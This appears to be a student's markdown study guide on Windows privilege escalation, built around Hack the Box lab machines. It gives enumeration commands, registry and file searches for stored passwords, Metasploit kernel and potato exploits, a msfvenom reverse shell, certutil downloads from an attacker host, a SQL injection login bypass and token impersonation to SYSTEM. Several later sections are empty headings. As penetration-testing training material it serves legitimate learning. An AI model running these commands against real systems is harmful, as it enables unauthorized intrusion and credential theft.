# Windows Privilege Escalation

Fuzzy Security Guide - https://www.fuzzysecurity.com/tutorials/16.html

PayloadsAllTheThings Guide - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

Absolomb Windows Privilege Escalation Guide - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

Sushant 747's Guide (Country dependant - may need VPN) - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html

## Gaining a Foothold

Hack the Box: Devel

msfvenom: https://netsec.ws/?p=331

## Initial Enumeration

Hack the Box: Devel

### System Enumeration

```
systeminfo
systeminfo | findstr /B /C: "OS Name" /C:"OS Version" /C:"System Type"
```
```
hostname
```
```
wmic wfe
wmic wfe get Caption,Description,HotFixID,InstalledOn
```
```
wmic logicaldisk get caption,description,providername
```

### User Enumeration

```
whoami
whoami /priv
whoami /groups
```
```
net user
net user hunter
net user administrator
net localgroup
net localgroup administrators
```

### Network Enumeration

```
ipconfig
ipconfig /all
```
```
arp -a
arp -all
```
```
route print
```
```
netstat -ano
```

### Password Hunting

Search for them:

```
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*
```

In Files:

```
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
```

In Registry:

```
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### AV Enumeration

```
query windefend
```
```
sc queryex type= service
```
```
net advfirewall firewall dump
```
```
firewall show state
```
```
netsh fireall show config
```

## Exploring Automated Tools

Hack the Box: Devel

winpeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS

Windows Priv Esc Checklist: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation

Sherlock: https://github.com/rasta-mouse/Sherlock

Watson: https://github.com/rasta-mouse/Watson

PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

JAWS: https://github.com/411Hall/JAWS

Windows Exploit Suggester: https://github.com/AonCyberLabs/Windows-Exploit-Suggester

Metasploit Local Exploit Suggester: https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/

Seatbelt: https://github.com/GhostPack/Seatbelt

SharpUp: https://github.com/GhostPack/SharpUp

---

Upload WinPEAS to Windows Machine

```
cd c:\\windows\\temp
upload /root/tranfers/winPEAS.exe
shell
```

```
winPEAS.exe
```

Run PowerShell on Windows machine

```
powershell -ep bypass
```

Load PowerShell via MetaSploit

```
load powershell
```

Meterpreter Exploit Suggester

```
run post/multi/recon/local_exploit_suggester
```

Windows Exploit Suggester Python

```
./windows-exploit-suggester.py --update
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py; python get-pip.py
pip install xlrd --upgrade
./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo sysinfo.txt
```

## Escalation Path: Kernel Exploits

Hack the Box: Devel

Windows Kernel Exploits: https://github.com/SecWiki/windows-kernel-exploits

### Escalation with Metasploit

Kitrap0d Info: https://seclists.org/fulldisclosure/2010/Jan/341

```
use exploit/windows/local/ms10_015_kitrap0d
options
set session 9
set LHOST tun0
set LPORT 5555
run
getuid
shell
```

### Manual Kernel Exploitation

MS10-059: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f -aspx > manual.aspx 
nc -nvlp 4444
```
```
ftp 10.10.10.5
put manual.aspx
```
```
python3 -m http.server 80
```
```
cd temp
certutil -urlcache -f hxxp://10.10.14.5/MS10-059.exe ms.exe
ms.exe 10.10.14.5 5555
```

## Escalation Path: Passwords and Port Forwarding

Hack the Box: ChatterBox

Achat Exploit: https://www.exploit-db.com/exploits/36025

Achat Exploit (Metasploit): https://www.rapid7.com/db/modules/exploit/windows/misc/achat_bof

### Gaining Foothold 

```
searchsploit achat
searchsploit -m 36025.py
```

### Escalation via Stored Passwords

Plink Download: https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html

```
sysinfo
net user alfred
ipconfig
netstat -ano
```
```
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

Plink 

```
python3 -m http.server 80
```
```
certutil -urlcache -f hxxp://10.10.14.5/plink.exe
```
```
sudo apt install ssh
gedit /etc/ssh/sshd_config
(Uncomment PermitRootLogin and change the value to yes)
service ssh restart
service ssh start
```
```
plink.exe -l root -pw toor -R 445:127.0.01:445 10.10.14.5
netstat -ano | grep 445
```
```
winexe -U Administrator%Welcome1! //127..0.0.1 "cmd.exe"
```

## Escalation Path: Windows Subsystem for Linux

Hack the Box: SecNotes

### Gaining a Foothold

SQL Injection on the Register Login page

```
' OR 1 OR '
```

Login with the SQL Injection

Try PsExec

```
psexec.py tyler:'password'@10.10.10.97
```

Try New Site SMB

```
smbclient \\\\10.10.10.97\new-site -U tyler
put nc.exe
put rev.php (php reverse shell)
```

On Kali Box

```
locate nc.exe
cp <path to nc.exe> nc.exe
nc -nvlp 4444
```

Go to web page, hxxp://10.10.10.97/rev.php to execute revshell.

### Escalation via WSL

Spawning TTY Shell: https://netsec.ws/?p=337

Impacket Toolkit: https://github.com/SecureAuthCorp/impacket

```
where /R c:\windows bash.exe
where /R c:\windows wsl.exe
<path_to_bash.exe>
python -c "import pty;pty.spawn('/bin/bash')"
history (shows admin password)
```

```
psexec.py administrator:'password'@10.10.10.97 (doesnt work)
smbexec.py administrator:'password'@10.10.10.97
```

## Impersonation and Potato Attacks

### Token Impersonation

Two Types:
- Delegate
- Impersonate

### Impersonation Privileges

```
whoami /priv (look for SeImpersonatePrivelege)
```

- SeAssignPrimaryToken - look for this one for potato attack
- SeBackup
- SeCreateToken
- SeDebug
- SeTakeOwnership

### Potato Attacks

Rotten Potato: https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/

Juicy Potato: https://github.com/ohpe/juicy-potato

### Gaining Foothold

Hack the Box: Jeeves

Groovy Reverse Shell: https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76

- Navigate to HTTP port 80 and 50000
- Run Directory Enum against 50000
- Navigate to askjeeves directory, and then to script console. It runs groovy.
- Run Groovy Reverese Shell

### Escalation via Potato Attack

```
msfconsole
use exploit/multi/script/web_delivery
options
show targets
set target 2 (PSH)
set payload windows/meterpreter/reverse_tcp
set lhost
set srvhost
run
(copy shell and put into victim machine)
getuid
getprivs
run post/multi/recon/local_exploit_suggester
background
use windows/local/ms16_075_reflection
options
(make sure all settings are the same, and LPORT changed, and payload to windows/x4/meterpreter/reverse_tcp)
run
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
shell
whoami
type hm.txt
```

### Alternate Data Streams

Alternative Data Streams: https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/

```
dir /R
more < hm.txt.root.txt:$DATA
```

## Escalation Path: getsystem

getsystem Explained: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/

Meterpreter Shell

```
getsystem
getsystem -h
```

## Escalation Path: RunAs

Microsoft Documentation: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)

### Gaining a Foothold

Hack the Box: Access

- Navigate to HTTP port 80
- Check FTP Anonymous Login (ls, cd backups, get backup.mdb, cd engineer, get "access control.zip")
- Explore what you grabbed
- Use mdb-sql to read/open those files
- Enumerate tables (auth_user)
- unzip Access Control file and read email (find creds)
- telnet into machine with found creds

### Escalation via RunAs

```
cmdkey /list
```
```
C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users
Administrator\Desktop\root.txt > C:\Users\security\root.txt"
```

## Additional Labs

TryHackMe - https://tryhackme.com/

Windows PrivEsc Lab - https://tryhackme.com/room/windowsprivescarena

## Escalation Path: Registry

### Autoruns

### Escalation via Autoruns

### AlwaysInstallElevated

### regsvc ACL

## Escalation Path: Executable Files

### Escalation via Executable Files

## Escalation Path: Startup Applications

icacls Docs: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls

### Escalation via Startup Applications

## Escalation Path: DLL Hijacking

## Escalation Path: Service Permissions (Paths)

### Escalation via Binary Paths

### Escalation via Unquoted Service Paths

### Gaining a Foothold

### Escalation via Unquoted Service Paths Metasploit

### Manual Challenge

## Escalation Path: CVE-2019-1388

ZeroDayInitiative CVE-2019-1388: https://www.youtube.com/watch?v=3BQKpPNlTSo

### Gaining a Foothold

### Escalation via CVE-2019-1388

Rapid7 CVE-2019-1388: https://www.rapid7.com/db/vulnerabilities/msft-cve-2019-1388

## Capstone Challenge

Basic Powershell for Pentesters: https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters

Mounting VHD Files: https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25

Capturing MSSQL Creds: https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478
